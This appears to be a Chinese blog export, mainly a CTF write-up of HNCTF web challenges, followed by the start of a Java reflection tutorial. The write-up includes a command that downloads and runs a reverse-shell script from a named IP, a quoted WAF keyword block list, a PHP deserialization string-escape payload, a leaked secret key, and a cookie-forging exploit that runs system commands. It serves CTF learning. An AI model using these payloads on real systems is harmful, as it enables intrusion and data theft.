<p>题目直接将后端语句告诉了我们，但是只要一次执行的机会，但是其flag只有当其执行一次命令后才会生成。即我们要执行两次，一开始我直接像到了弹个shell不就好了。于是我直接尝试弹shell。但是其后台禁了很多导致无法弹shell。<br>这时候我又想到这道题目有python环境那么我直接远程下载一个可以反弹shell的python脚本在执行不就好了<br>于是我用kali生成了一个反弹shell的python脚本<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><br>然后挂在在vps上<br>传值<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=__import__(&quot;os&quot;).popen(&quot;wget 111.230.38.159:8000/shell.py -O /tmp/shell.py;chmod 777 /tmp/shell.py;/tmp/shell.py&quot;).read()</span><br></pre></td></tr></table></figure><br>成功反弹shell<br>之后再刷新一下就可以读取flag了</p>
<h1 id="ez-tp"><a href="#ez-tp" class="headerlink" title="ez_tp"></a>ez_tp</h1><p>这题考的是thinkphp的代审,审计难度其实不算太低，但是其log泄露了，那难度就直线下降了<br>打开源码发现其版本为3.2.3在网上搜一下发现其存在sql注入漏洞<br>在全局搜索<code>装起来了</code>可以找到web页面的源码<br><img src="/2024/05/13/hnctf-wp/ez_tp2.png" class="" title="alt text"><br>我们查看h_n函数<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">h_n</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;getallheaders&#x27;</span>)) &#123;</span><br><span class="line">                <span class="function"><span class="keyword">function</span> <span class="title">getallheaders</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$_SERVER</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="number">0</span>, <span class="number">5</span>) == <span class="string">&#x27;HTTP_&#x27;</span>) <span class="variable">$headers</span>[<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="title function_ invoke__">ucwords</span>(<span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="number">5</span>))))) ] = <span class="variable">$value</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable">$headers</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$get</span> = <span class="variable">$_GET</span>;</span><br><span class="line">            <span class="variable">$post</span> = <span class="variable">$_POST</span>;</span><br><span class="line">            <span class="variable">$cookie</span> = <span class="variable">$_COOKIE</span>;</span><br><span class="line">            <span class="variable">$header</span> = <span class="title function_ invoke__">getallheaders</span>();</span><br><span class="line">            <span class="variable">$files</span> = <span class="variable">$_FILES</span>;</span><br><span class="line">            <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line">            <span class="variable">$method</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>];</span><br><span class="line">            <span class="variable">$filepath</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_NAME&quot;</span>];</span><br><span class="line">            <span class="comment">//rewirte shell which uploaded by others, you can do more</span></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$_FILES</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$files</span>[<span class="variable">$key</span>][<span class="string">&#x27;content&#x27;</span>] = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="variable">$key</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_FILES</span>[<span class="variable">$key</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&quot;virink&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$header</span>[<span class="string">&#x27;Accept&#x27;</span>]); <span class="comment">//fix a bug</span></span><br><span class="line">            <span class="variable">$input</span> = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;Get&quot;</span> =&gt; <span class="variable">$get</span>,</span><br><span class="line">                <span class="string">&quot;Post&quot;</span> =&gt; <span class="variable">$post</span>,</span><br><span class="line">                <span class="string">&quot;Cookie&quot;</span> =&gt; <span class="variable">$cookie</span>,</span><br><span class="line">                <span class="string">&quot;File&quot;</span> =&gt; <span class="variable">$files</span>,</span><br><span class="line">                <span class="string">&quot;Header&quot;</span> =&gt; <span class="variable">$header</span></span><br><span class="line">            );</span><br><span class="line">            <span class="comment">//deal with</span></span><br><span class="line">            <span class="variable">$pattern</span> = <span class="string">&quot;insert| |delete|and|or|\/\*|\*|\.\.\/|\.\/|into|load_file|outfile|dumpfile|sub|hex&quot;</span>;</span><br><span class="line">            <span class="variable">$pattern</span>.= <span class="string">&quot;|file_put_contents|fwrite|curl|system|eval|assert&quot;</span>;</span><br><span class="line">            <span class="variable">$pattern</span>.= <span class="string">&quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;</span>;</span><br><span class="line">            <span class="variable">$pattern</span>.= <span class="string">&quot;|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec&quot;</span>;</span><br><span class="line">            <span class="variable">$vpattern</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;|&quot;</span>, <span class="variable">$pattern</span>);</span><br><span class="line">            <span class="variable">$bool</span> = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$vpattern</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$v</span> <span class="keyword">as</span> <span class="variable">$kk</span> =&gt; <span class="variable">$vv</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/<span class="subst">$value</span>/i&quot;</span>, <span class="variable">$vv</span>)) &#123;</span><br><span class="line">                            <span class="variable">$bool</span> = <span class="literal">true</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$bool</span>) <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$bool</span>) <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$bool</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;GET.name&#x27;</span>);</span><br><span class="line">        <span class="variable">$User</span> = <span class="title function_ invoke__">M</span>(<span class="string">&quot;user&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">waf</span>())&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">index</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$ret</span> = <span class="variable">$User</span>-&gt;<span class="title function_ invoke__">field</span>(<span class="string">&#x27;username,age&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$name</span>))-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">var_export</span>(<span class="variable">$ret</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>以为其文件被定义为<br>namespace Home\Controller;<br>use Think\Controller;<br>所以我们通过/index.php/Home/Index/h_n来访问h_n函数。<br>查看h_n函数发现主要的漏洞部分是如下的部分<br><img src="image-3.png" alt="alt text"><br>这时候我在全局搜索了一下网上的payload结果让我发现了，出题人的log没删，直接一件payload了<br><img src="/2024/05/13/hnctf-wp/3.png" class=""><br>在写这道题目的wp时我有尝试自己审计一遍，结果我发现我的动调环境没有搞好，我准备有时间搞一搞，看了一下出题人的payload，说实话没搞懂为什么要那么闭合，还是得学习啊。</p>
<h1 id="Decrypt"><a href="#Decrypt" class="headerlink" title="Decrypt"></a>Decrypt</h1><p>这题花了几个小时来审计结果竟然，下线了，悲<br>这题存在源码泄露www.zip<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;waf.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;login.html&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;algorithm.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	<span class="variable">$passwd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">	<span class="variable">$login</span> = <span class="keyword">new</span> <span class="title class_">Users</span>(<span class="variable">$username</span>, <span class="variable">$passwd</span>,<span class="string">&quot;True&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">encryptCookie</span>(<span class="title function_ invoke__">b</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$login</span>)))), <span class="title function_ invoke__">time</span>() + <span class="number">3600</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">	<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;location.href=`./login.php`;&lt;/script&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>首先在index.php发现了序列化入口其将function.php的Users实例化后进行序列化。那么这题应该考察反序列化漏洞。于是我找了一下发现<br>login.php和eeeeeend.php都存在反序列入口但是eeeeeeeend.php的反序列入口是这样的<code>unserialize(decryptCookie(base64_decode($_COOKIE[&#39;users&#39;])));</code>需要对session进行伪造，无法直接利用那么我就把目光看向了login.php<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;waf.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;algorithm.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(`Login First!`);location.href=`./index.php`;&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">a</span>(<span class="title function_ invoke__">decryptCookie</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;Hello CTFer!,Welcome to Ezez_unserialize!!!!!&lt;/h1&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>发现其导入了funtion.php而funtion.php正好有类可以利用。<br>function.php<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Users</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$passwd</span>,<span class="variable">$status</span>=<span class="string">&quot;True&quot;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd = <span class="variable">$passwd</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;status = <span class="variable">$status</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;username);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;passwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>当login反序列化时会触发Users的 <strong>destruct而这个方法有unset，这个函数可以利用GC回收机制来触发</strong>destruct那么我们就可以触发FILE。而FILE存在file_get_contents函数。<br>而login在反序列化前先过了一遍waf，这就导致了字符串逃逸。那么我们通过字符串逃逸来构造passwd的值从而导致反序列。我这里直接贴我写的脚本<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=<span class="string">&quot;where&quot;</span></span><br><span class="line">payload=<span class="string">&#x27;&quot;;s:13:&quot;%00Users%00passwd&quot;;O:4:&quot;FILE&quot;:1:&#123;s:8:&quot;filename&quot;;s:54:&quot;php://filter/convert.base64-encode/resource=config.php&quot;;&#125;s:6:&quot;status&quot;;N;&#125;&#x27;</span></span><br><span class="line">I=<span class="built_in">len</span>(unquote(payload))-<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(I):</span><br><span class="line">    s+=<span class="string">&quot;where&quot;</span></span><br><span class="line"><span class="built_in">print</span>(s+payload)</span><br></pre></td></tr></table></figure><br>我们只要在passwd里输入payload就会导致字符串逃逸，从而触发FIlE来读取文件。<br>我原本准备直接读取flag或者直接通过proc读取环境变量的，结果发现好像权限不够无法读取。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encryptCookie</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$algorithm</span>,<span class="variable">$secret_key</span>;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$secret_key</span>;</span><br><span class="line">    <span class="variable">$cipher</span> = <span class="variable">$algorithm</span>;</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$cipher</span>));</span><br><span class="line">    <span class="variable">$encryptedValue</span> = <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$value</span>, <span class="variable">$cipher</span>, <span class="variable">$key</span>, <span class="number">0</span>, <span class="variable">$iv</span>) . <span class="string">&#x27;::&#x27;</span> . <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$iv</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$encryptedValue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decryptCookie</span>(<span class="params"><span class="variable">$cookie</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$algorithm</span>,<span class="variable">$secret_key</span>;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$secret_key</span>;</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$encrypted_data</span>, <span class="variable">$iv</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;::&#x27;</span>, <span class="variable">$cookie</span>);</span><br><span class="line">    <span class="variable">$cipher</span> = <span class="variable">$algorithm</span>;</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$iv</span>);</span><br><span class="line">    <span class="variable">$decryptedValue</span> = <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$encrypted_data</span>, <span class="variable">$cipher</span>, <span class="variable">$key</span>, <span class="number">0</span>, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$decryptedValue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我发现其加密函数的密钥来自config.php那么我只要读取config.php不就可以得到密钥来伪造session从而来触发eeeeeeend.php的命令执行了吗。<br>于是我读取了conifg.php<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:13:&quot;%00Users%00passwd&quot;;O:4:&quot;FILE&quot;:1:&#123;s:8:&quot;filename&quot;;s:54:&quot;php://filter/convert.base64-encode/resource=config.php&quot;;&#125;s:6:&quot;status&quot;;N;&#125;</span><br></pre></td></tr></table></figure><br>config.php<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$secret_key</span> = <span class="string">&quot;Harder_says_nice_to_meet_to&quot;</span>;</span><br><span class="line"><span class="variable">$algorithm</span> = <span class="string">&quot;AES-128-CTR&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>这样就可以对构造session进行命令执行了<br>exp如下<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;algorithm.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$root</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;root;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Date</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">admin</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;root=<span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;root-&gt;cmd=<span class="string">&quot;env&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">#echo (encryptCookie(serialize($a)));</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">encryptCookie</span>(<span class="variable">$b</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><br>从环境变量里得到flag</p>
<h1 id="ManCraft-娱乐题"><a href="#ManCraft-娱乐题" class="headerlink" title="ManCraft - 娱乐题"></a>ManCraft - 娱乐题</h1><p>直接进游戏打牢大即可</p>
]]></content>
      <categories>
        <category>wp</category>
        <category>比赛wp(复现)</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>java反射</title>
    <url>/2024/07/14/java%E5%8F%8D%E5%B0%84/</url>
    <content><![CDATA[<h1 id="放假前就一直想着要在暑假学一下java的漏洞，大体看了一下发现java的内容不是一般的多，就从java的反射开始学吧。"><a href="#放假前就一直想着要在暑假学一下java的漏洞，大体看了一下发现java的内容不是一般的多，就从java的反射开始学吧。" class="headerlink" title="放假前就一直想着要在暑假学一下java的漏洞，大体看了一下发现java的内容不是一般的多，就从java的反射开始学吧。"></a>放假前就一直想着要在暑假学一下java的漏洞，大体看了一下发现java的内容不是一般的多，就从java的反射开始学吧。</h1><h1 id="java的反射机制"><a href="#java的反射机制" class="headerlink" title="java的反射机制"></a>java的反射机制</h1><p>Java的反射机制是Java非常重要的动态特性，我们学过的php就有着丰富的动态特性。而java并没有php那么的灵活，所以java反射所带来的动态特性就显得和重要了。通过反射我们不仅可以得到任何类的成员方法，构造方法，成员属性，还可以实例化类，调用任意的类方法、修改任意的类成员变量值等</p>
<h1 id="放射的步骤"><a href="#放射的步骤" class="headerlink" title="放射的步骤"></a>放射的步骤</h1><p>放射的步骤分为如下几个<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.反射获取类</span><br><span class="line">2.获取类的方法</span><br><span class="line">3.创建类的实例化对象</span><br><span class="line">4.使用类的方法</span><br></pre></td></tr></table></figure><br>下面我会给出每个步骤所使用的函数。</p>
<h2 id="反射获取类"><a href="#反射获取类" class="headerlink" title="反射获取类"></a>反射获取类</h2><h3 id="forName"><a href="#forName" class="headerlink" title="forName"></a>forName</h3><p>在反射中最常用到的获取类的函数就是forname。<br>其有如下两种调用方法<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; forName(String name)</span><br><span class="line">Class&lt;?&gt; forName(String name, **<span class="type">boolean</span>** initialize, ClassLoader loader)</span><br></pre></td></tr></table></figure><br><code>Class&lt;?&gt; forName(String name, **boolean** initialize, ClassLoader loader)</code>中第二个参数为是否初始化，第三个参数为加载器的选择。<br>默认的调用方法即第一种调用方法，其默认为会初始化。<br>关于初始化我这里稍微展开说一下<br>首先我们看如下类初始化后输出的结果<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrainPrint</span> &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Empty block initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Static initial %s\n&quot;</span>, TrainPrint.class);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TrainPrint</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>这个类初始化后输出结果为<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Static initial class TrainPrint</span><br><span class="line">Empty block initial class TrainPrint</span><br><span class="line">Initial class TrainPrint</span><br></pre></td></tr></table></figure><br>这是因为初始化的过程按顺序分为三步<br>1.静态初始化块<br>静态初始化块是在类加载完成后、实例化任何对象之前执行的。<br>静态初始化块只执行一次，用于初始化类的静态变量。<br>2.实例初始化块<br>实例初始化块是在每次创建类的实例时执行的。<br>实例初始化块在构造方法之前执行。<br>3.构造方法<br>构造方法是在实例初始化块之后执行的，用于初始化对象的实例变量。</p>
<h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException &#123;</span><br><span class="line">        Class clazz=Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">        System.out.println(clazz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">class java.lang.Runtime</span><br></pre></td></tr></table></figure>
<h3 id="ClassLoader-getSystemClassLoader-loadClass"><a href="#ClassLoader-getSystemClassLoader-loadClass" class="headerlink" title="ClassLoader.getSystemClassLoader().loadClass"></a>ClassLoader.getSystemClassLoader().loadClass</h3><p>使用这个也可以加载类，但是和forName不同的是这个方法不会初始化类<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = ClassLoader.getSystemClassLoader().loadClass(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        System.out.println(clazz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------------------------</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">java</span>.lang.Runtime</span><br></pre></td></tr></table></figure></p>
<h3 id="类名-class"><a href="#类名-class" class="headerlink" title="类名.class"></a>类名.class</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = java.lang.Runtime.class;</span><br><span class="line">        System.out.println(clazz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------------------------</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">java</span>.lang.Runtime</span><br></pre></td></tr></table></figure>
